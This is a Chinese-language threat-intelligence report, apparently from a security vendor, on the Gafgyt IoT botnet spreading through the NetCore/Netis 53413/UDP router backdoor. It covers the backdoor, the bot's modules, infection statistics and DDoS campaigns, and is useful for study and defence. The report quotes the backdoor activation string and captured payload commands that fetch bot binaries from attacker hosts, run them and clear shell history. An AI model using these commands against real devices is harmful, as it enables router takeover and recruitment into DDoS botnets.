1 概述
近日，安天捕风蜜网系统监控并捕获到大量异常的UDP流量，通过对该流量的分析，发现存在僵尸网络控制节点（C2）位于美国的黑客组织正在对全球网络的NetCore 53413/UDP后门端口进行扫描攻击。
早在2014年，由国内电子厂商生产的一系列名为NetCore的路由器产品就已经被有关安全研究员披露有高权限的后门存在，该后门可能会影响全球大约300万台NetCore系列路由器等设备。此次53413/UDP后门被国外物联网僵尸网络Gafgyt家族再次利用，可见目前互联网上还存在大量有该后门的路由器设备，而这些设备很大可能被作为高危的潜在“肉鸡”。结合目前关联捕获的Gafgyt样本分析，发现其Tel/SSH扫描爆破的IP网段重点分布在越南（占比33.04%）、中国（占比26.08%）以及其他亚洲国家（占比17.82%），其地理位置与NetCore产品的主要销售对象重合度很大。通过安天捕风蜜网系统单日捕获的流量和云堤关联流量分析识别，全国有33230台“肉鸡”在线尝试与指定Gafgyt家族僵尸网络C2连接。
综合上述情况分析，可见NetCore 53413/UDP 后门端口与Gafgyt家族僵尸网络的结合，对我国的互联网安全存在很大威胁。
2 NetCore 53413后门
2.1 53143端口后门漏洞概述
2014年8月末，由中国电子厂商生产的系列路由器（国内品牌名称为 Netcore，国外品牌名称为Netis）被爆出含有一个严重的后门漏洞[参考1、2]。攻击者可以通过此漏洞获取路由器Root权限。实际上，Netcore的大量路由器产品存在可以轻易利用的后门漏洞，攻击者可利用硬编码的后门口令访问该后门服务，并可执行任意命令以及上传、下载文件，获取WEB登录口令等操作，可完全控制受影响的产品。
由于此后门存在监听53413/UDP端口的情况，故可以从受影响设备的WAN端利用，即攻击者可从互联网上任何地方利用此漏洞。早在2014年，有关微博[参考3]上就已经披露Netcore存在超级后门。
2.2 53143端口后门分析
Netcore系列路由器在/bin目录下存在一个名为igdmptd的程序，此程序会监听UDP端口、 53413 端口，之后调用operate_loop进入事件循环，接受连接并处理。通过连接 53413端口，可以通过特定格式的报文来获取路由器上的文件信息，上传文件甚至执行系统命令。
分析详情如下：
分析Pcap包，利用wireshark分析UDP报文Data数据段，其发送到53413端口的数据为AAAAAAAAnetcore.，从而激活后门登录。接着发送另外一段UDP报文，切换目录下载Gafgyt僵尸网络木马并执行，数据段为：
AA..AAAA cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r asuna.mpsl -g 185.173.25.247;cat asuna.mpsl >freg;chmod 777 freg;./freg netis; rm -rf freg; tftp -r asuna.mips -g 185.173.25.247;cat asuna.mips >freg;chmod 777 freg;./freg netis; rm -rf freg
完整利用过程如图1和图2所示：
图1 后门登录
图 2 执行任意恶意代码
3 关联Gafgyt家族样本分析
3.1 Gafgyt家族功能简介
Gafgyt家族“肉鸡”的主要功能分为3个模块：
1、Downloader模块。通过样本硬编码的url下载.sh脚本和其他附属样本，然后执行该脚本/样本，实现“肉鸡”感染（样本硬编码的url类似与hfs链接）。
2、Scanner模块。木马在运行后，首先会向C2发送首包，而该首包与通常的僵尸网络家族首包存在比较大的区别。常见的僵尸网络家族首包是包含系统配置等信息的，而Gafgyt首包数据是“BUILD RAZER.”，C2则通常回复“!* SCANNER ON”，命令“肉鸡”随机对指定IP网段进行Tel/SSH弱口令扫描爆破，如果“肉鸡”发现爆破成功，便通过远程登录下载并植入木马。
3、DDoS攻击。“肉鸡”在执行Tel/SSH扫描爆破的同时，也在和C2保持正常通讯，等待C2的相关指令，例如DDoS攻击指令。Gafgyt可实现的主要攻击方式包括：SYN Flood、UDP Flood、UDP Amplification、TCP Flood、RST Flood、HTTP Flood。
3.2 Gafgyt家族木马功能分析
1、样本执行"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 0.0.0.0/scan.py"指令，安装Python编译器，然后通过获取硬编码在样本内的url进行下载并执行scan.py脚本实现22端口扫描爆破功能。如图3 所示：
图3 scan.py脚本扫描爆破
2、样本通过硬编码嵌入的IP网段SSH_SCAN ON指令的22端口爆破。如图4 所示：
图4 执行SSH_SCAN ON爆破
3、Tel爆破。同样是获取样本硬编码的IP网段执行Tel_SCAN ON的23端口爆破，并远程Tel登录被爆破成功的IP，执行"cd /tmp; wget http://catsmeowalot.com/a; chmod 777 a; ./a; cd; rm -rf ./bash_history; history -c*\r
"指令，植入Gafgyt被控端木马。如图5 所示：
图5 Gafgyt植入木马
4、执行DDoS攻击指令。“肉鸡”在进行Tel/ssh扫描爆破的同时，也在与C2进行正常通讯，实时接收C2的远程指令，例如DDoS攻击指令。如图6 所示：
“肉鸡”执行HTTP Flood攻击：
图6 执行HTTP Flood 攻击
“肉鸡”执行UDP Flood攻击。如图7 所示：
图7 执行UDP Flood 攻击
图8 执行TCP Flood 攻击
“肉鸡”执行SYN Flood攻击。如图9 所示：
图9 执行SYN Flood 攻击
3.3 Gafgyt家族攻击协议分析
表-1 Gafgyt家族协议数据
4 关联Gafgyt僵尸网络威胁情报
4.1 关联的Gafgyt僵尸网络架构
图 10物联网木马Gafgyt与NetCore 后门组成的僵尸网络架构
经过对53413/UDP端口后门及对应的Gafgyt家族木马样本的关联分析获取整个僵尸网络的架构。
后门和远程端口扫描爆破功能
Vulne_Scanner：Vulne_Scanner功能模块是独立运行在几台服务器中，主要是黑客通过自定义配置扫描IP网段扫描探测开放有53143/UDP端口后门的IP，并通过后门默认密码登录远程执行Gafgyt木马植入或者下载植入木马的Shell脚本的Payload。
Tel/SSH爆破：Tel/SSH远程服务端口爆破模块集于被控端木马中，是通过使用“肉鸡”集群爆破实现高效率蠕虫式感染指定IP网段存在弱口令的IoT/Linux设备。“肉鸡”将爆破直接执行木马植入指令或者下载Shell脚本批量自动枚举植入木马。通过对关联到的Gafgyt僵尸网络木马分析得知，其Tel/SSH扫描爆破目标IP网段已经硬编码在木马中。通过对这些IP/16网段进行定位查询得知，关联的Gafgyt僵尸网络主要是扫描爆破越南、中国、英国、印度、菲律宾等亚洲国家。详细IP网段的国家比例如下图11所示：
图 11关联Gafgyt僵尸网络Tel/SSH爆破IP/16网段全球分布统计
经过统计Tel/SSH爆破的IP/16网段结果显示，其中，网段最多的是越南，有31个IP/16网段，占33.04%；中国位列第二，有30个IP/16网段，占26.08%；英国有11个IP/16网段，占9.565%，位列第三；印度第四，有6个IP/16网段，占比约5.22%；土耳其有4个IP/16网段，占约3.48%。需要指出的是，目前捕获的5个关联的Gafgyt僵尸网络C2均位于美国，但对美国爆破的IP/16网段却只有1个，占1%不到；而整个亚洲却有85个爆破IP/16网段，约占79.91%，很明显，该Gafgyt僵尸网络入侵感染木马的物联网设备目标主要位于亚洲。
如图下所示，经过对Gafgyt僵尸网络Tel/SSH爆破的30个国内IP/16网段梳理获知，其主要扫描的是辽宁、四川、黑龙江、福建、山东、香港的物联网设备。从IP网段分布比例看，与目前捕获的“肉鸡”分布存在一些差异。该问题存在的原因，可能是蜜网部署节点并没有在扫描的IP网段列表中，或是捕获的流量地域比较集中。但有一点可以肯定的是，本次关联到的Gafgyt僵尸网络重点IP网段扫描是在下图所示的省份。
无论是Vulne_Scanner还是Tel/SSH扫描爆破，获取到的远程代码任意执行权限，都会下载并运行存放在TFP里面的Gafgyt家族木马。
“肉鸡”& C2交互
“肉鸡”在进行IP网段漏洞扫描的同时，也会和C2进行连接通信，时刻等待并执行C2下发的攻击指令。从之前Gafgyt的攻击手法中看出，有SYN Flood、UDP Flood、UDP Amplification、TCP Flood、RST Flood、HTTP Flood等攻击类型。
4.2 关联Gafgyt僵尸网络攻击情报
安天捕风小组团队已对关联Gafgyt僵尸网络集群进行了长达一个月的实时监测。目前已经监测到关联Gafgyt僵尸网络集群向美国、巴西、英国、荷兰、法国、罗马尼亚、澳大利亚、厄瓜多尔、阿根廷、葡萄牙、乌克兰、加拿大、韩国等国家发起了586条间歇性DDoS攻击（如下图所示），造成了83个攻击事件。从攻击情报数据上看，关联Gafgyt僵尸网络集群没有对国内任何目标进行DDoS攻击，但是却存在大量的物联网设备被充当“肉鸡”的情况。
图-13 关联Gafgyt僵尸网络集群DDoS攻击统计
4.3 关联的Gafgyt僵尸网络“肉鸡”情报
通过安天捕风蜜网系统和电信云堤对关联到的C2进行“肉鸡”IP排查，获取到国内部分存在关联的“肉鸡”有33230台。经过对这些“肉鸡”进行地域查询并按省份分析统计获知，关联到的“肉鸡”IP主要分布在沿海或内陆发达地区，其中有“肉鸡”IP达到1000台以上的有9个省份，分别是浙江6141台、江苏5820台、广东3266台、重庆2917台、安徽2019台、四川1279台、福建1153台、湖南1069台、山东1033台，这9个省份“肉鸡”IP占据了目前捕获关联到的C2国内的“肉鸡”中的74.32%（详细如下图统计所示）。但这些各省份“肉鸡”数据比例与IP/16扫描数据比例确实存在一些差异，出现该情况的主要原因可能为以下几点：
1. 安天捕风小组没有针对本次Gafgyt僵尸网络所爆破的IP/16网段进行部署。
2. 电信云堤的数据监测分析，主要针对历史“肉鸡”高发的地区进行数据筛查。
3. 本次捕获的“肉鸡”，大部分应该是通过NetCore的53413/UDP端口后门感染，这一点在安天捕风蜜网系统捕获的数据中可以得到验证。
图14 国内关联Gafgyt僵尸网络捕获“肉鸡”分布情况统计
5 总结
最近几年，物联网僵尸网络得到了快速发展，设备漏洞利用与僵尸网络的结合已经十分常见，特别是起源于国外的Mirai和Gafgyt两个家族，经常会利用最新0day漏洞变异版本，使大量物联网设备感染木马。究其根本原因，是因为近年来物联网行业在成为全球热点后迅速发展，市场需求和经济利润也在不断增长，但很多物联网设备在研发期间盲目追求产品功能进度，缺失了对设备安全的重视，导致大批物联网设备存在各种类型的高危漏洞。由于物联网设备基数大、高危漏洞多、防御措施少、监管措施不足，促使黑客对全球大量物联网设备进行了僵尸网络木马的大肆感染，使其沦为其控制下的“肉鸡”，默默做着没有报酬的“DDoS打手”或“矿工”。据统计，全球至少有1000万台物联网设备存在高危漏洞，这批潜在的“肉鸡”对任何一个黑客组织来说都是足以诱人的，哪怕只能用1%的量组成一个DDoS僵尸网络，其攻击流量也足以达到“TB”级别。所以，当前DDoS攻击流量能迅速从GB级别迅速提升到TB级别，很大原因是得益于大批物联网充当了“肉鸡”。
看似DDoS攻击对我们个人并没有多大影响，现实中却严重影响我们的生活和工作，甚至国家和互联网的安全。当DDoS僵尸网络执行攻击时，不仅攻击目标和“肉鸡”都属于受害者。2016年10月，美国域名服务商Dyn遭到大规模物联网僵尸网络DDoS攻击，导致美国东部大面积不能正常上网；同年11月底造成德国90多万台路由器和固定电话的网络瘫痪，就是因为相关设备被植入Mirai家族木马并执行DDoS攻击造成的网络堵塞。而黑客的攻击目标也从小范围的网络目标，升级到商业之间的竞争、国家金融服务，甚至国家之间的政治、军事行动等等。如今，DDoS僵尸网络搭建的简易性和廉价性，给互联网安全和我们日常生活和工作造成的威胁日趋严峻，维护网络安全发展仍然任重道远。
附录
【参考1】https://www.seebug.org/vuldb/ssvid-90227
【参考2】http://www.freebuf.com/news/41940.html
【参考3】http://www.weibo.com/p/1001603792736686871336
*本文作者：antiylab，转载请注明来自FreeBuf.COM